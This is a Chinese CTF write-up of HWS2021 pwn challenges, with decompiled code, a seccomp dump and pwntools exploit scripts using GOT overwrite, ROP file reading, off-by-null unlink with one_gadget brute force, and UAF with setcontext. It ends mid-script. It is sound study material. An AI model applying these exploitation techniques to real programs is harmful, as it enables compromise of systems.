+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">        -ex &quot;file ./emarm&quot; \</span><br><span class="line">        -ex &quot;set arch aarch64&quot; \</span><br><span class="line">        -ex &quot;b *0x400C40&quot; \</span><br><span class="line">        -ex &quot;target remote :1234&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Justcode"><a href="#Justcode" class="headerlink" title="Justcode"></a>Justcode</h2><p>普通的x64栈题，保护如下，此外这题是开了沙箱禁了execve的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>主逻辑如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400B06();</span><br><span class="line">  sub_400B8E();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    v7[i] = atoi(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v7[j];</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        choice_2();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        choice_1();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在一个函数里用scanf给了个任意地址写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">choice_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">120</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;id:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;info:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">108uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;no check&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个地址的值可以由另一个函数栈帧复用控制</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">choice_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  Chunk = (__int64)strdup(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check it : %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)Chunk);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数里第一个小点是其用的strdup，所以可以把栈上的libc dup进堆里从而在接下来的printf中泄露，第二个小点是这个函数里的溢出长度是可以覆盖Canary的</p>
+<p>所以整体的思路就是用任意地址写去改exit的got表为main，实现无限循环，然后泄露libc，最后把<code>__stack_chk_fail</code>函数的got表改成<code>pop xxx; ret</code>，从而执行栈上的ROP即可</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justcode&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_addr</span>(<span class="params">addr</span>):</span></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + addr</span><br><span class="line">	p.sendafter(<span class="string">&quot;name:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;id:&quot;</span>, content)</span><br><span class="line">	p.sendafter(<span class="string">&quot;info:&quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change exit_got</span></span><br><span class="line">main = <span class="number">0x400D4B</span></span><br><span class="line">code = <span class="string">b&#x27;1\n2\n3\n3\n&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line">p_addr(p64(elf.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">write(<span class="string">b&#x27;4197707&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write &#x27;flag&#x27; to bss</span></span><br><span class="line">bss = <span class="number">0x6020A0</span> + <span class="number">0x200</span></span><br><span class="line">code = <span class="string">b&#x27;1\n2\n3\n3\n&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line">p_addr(p64(bss))</span><br><span class="line"></span><br><span class="line">write(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;0x67616c66&quot;</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc and orw</span></span><br><span class="line">code = <span class="string">b&#x27;1\n1\n2\n1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;your code:\n&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f28a354361e</span> - <span class="number">0x7f28a34c8000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdi = <span class="number">0x400EA3</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line"></span><br><span class="line">p_addr(p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]))</span><br><span class="line">write(<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;0x400EA3&quot;</span>,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400C7F\nb *0x400D00\nb *0x400C8E\n&#x27;)</span></span><br><span class="line">payload = p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(puts)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="undlcv"><a href="#undlcv" class="headerlink" title="undlcv"></a>undlcv</h2><p>2.23的off by null，有点久远了都快忘了怎么打了，经典没开PIE和能改got表，触发unlink之后改堆指针，然后改got表为one_gadget</p>
+<p>这道题因为是没有输出函数的，所以最简单的办法应该是爆破one_gadget了，刚好有个函数的got表跟一个one_gadget只差0.5个字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;info&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;1&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(content)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.send(<span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	p.send(<span class="built_in">str</span>(index).ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add0</span>():</span></span><br><span class="line">	p.send(<span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">Heap = <span class="number">0x403480</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	add(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	fake = p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">	fake += p64(Heap - <span class="number">0x18</span>) + p64(Heap - <span class="number">0x10</span>)</span><br><span class="line">	fake = fake.ljust(<span class="number">0xf0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	fake += p64(<span class="number">0xf0</span>)</span><br><span class="line">	edit(<span class="number">0</span>,fake)</span><br><span class="line"></span><br><span class="line">	free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x403430</span>) + p64(Heap)</span><br><span class="line">	edit(<span class="number">0</span>, payload)</span><br><span class="line">	<span class="comment">#gdb.attach(p,&#x27;b *0x40123D&#x27;)</span></span><br><span class="line">	edit(<span class="number">0</span>, <span class="string">b&#x27;\x47\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./undlcv&quot;</span>)</span><br><span class="line">		p.timeout = <span class="number">0.1</span></span><br><span class="line">		pwn()</span><br><span class="line">		p.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		a = p.recv()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">			<span class="built_in">print</span>(a)</span><br><span class="line">			p.interactive()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="vtcpp"><a href="#vtcpp" class="headerlink" title="vtcpp"></a>vtcpp</h2><p>一道C++的2.23的堆，漏洞是UAF，总得来说还是比较简单的</p>
+<p>保护如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>开了沙箱，如下，需要用openat来代替open，此外是用seccomp开的，所以堆布局是乱的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> seccomp-tools dump ./vtcpp</span> </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>主逻辑如下</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-1.jpg" class>
+
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-2.jpg" class>
+
+<p>因为C++还没学，所以很多内容不太看得懂，只能自己去调一下理解一下（<del>有人大二了连C++都不会，令人感叹</del>）</p>
+<p>add主要的逻辑在<code>sub_401AD0((__int64)chunk, (__int64)v14, age);</code>函数里，总得来说最后的chunk结构如下</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-3.jpg" class>
+
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-4.jpg" class>
+
+<p>chunk+0处存的是个函数指针的指针，会用chunk+0x10处的指针输出内容，输出长度在chunk+0x18处记录，这个函数指针会在show时被调用</p>
+<p>delete处是个UAF，而且可以在case 4处把这个chunk重新拿出来改内容，改掉输出的指针以此泄露libc和堆，最后orw没想到很好的方法，所以用的是setcontext，但是程序add申请出来的堆块只有0x40的大小，是肯定不够setcontext的构造的，所以需要拿到跟这个chunk高位相邻的那个chunk，在本地观察时可以发现这个相邻的chunk恰好在unsorted bin处，所以可以用case 4直接拿出来构造setcontext的内容</p>
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-5.jpg" class>
+
+<img src="/2023/07/07/HWS2021%E5%85%A5%E8%90%A5%E8%B5%9B%E5%A4%8D%E7%8E%B0/vtcpp-6.jpg" class>
+
+<p>在本地这样打是没问题的，但是不太清楚打远程这样能不能行得通，不过感觉堆布局应该都是一样的，所以应该可以吧</p>
+<p>一个大师傅的方法是正好找到了一些些些些gadget能用栈上的数据栈迁移：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/">HWS 2021 入营赛 Pwn/固件/内核 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
+<p>此外，<code>openat</code>跟<code>open</code>有些不一样，其函数原型如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span> dirfd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span> dirfd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>openat函数是用来在指定的文件描述符所表示的目录中打开或者创建文件的，所以第一个参数应该是个目录的文件描述符，如果pathname是相对路径的话就会用到这个目录的文件描述符，但如果是绝对路径的话就不需要，例如上面贴的师傅的exp打开的就是<code>/flag</code>，所以第一个参数就随意。如果想操作当前工作目录的话（比如flag一般就在跟程序一样的目录中），就要设置成<code>at_fdcwd</code>（对应值是-100）。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vtcpp&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name, age, msg</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>, name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;age: &quot;</span>, age)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;message: &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">note</span>(<span class="params">size, content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">func_ptr = <span class="number">0x401D98</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;222&#x27;</span>, <span class="string">b&#x27;333&#x27;</span>)</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">free()</span><br><span class="line">payload = p64(func_ptr) + p64(<span class="number">0</span>) + p64(<span class="number">0x602F68</span>) + p64(<span class="number">8</span>)</span><br><span class="line">note(<span class="number">0x38</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;name :&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fd84b8f6750</span> - <span class="number">0x7fd84b8d6000</span>)</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = <span class="number">0x401350</span></span><br><span class="line">puts = <span class="number">0x401310</span></span><br><span class="line">pop_rdi = <span class="number">0x401CA3</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x000000000003a738</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000bc3f5</span></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">ret = <span class="number">0x401CA4</span></span><br><span class="line"><span class="comment"># leak 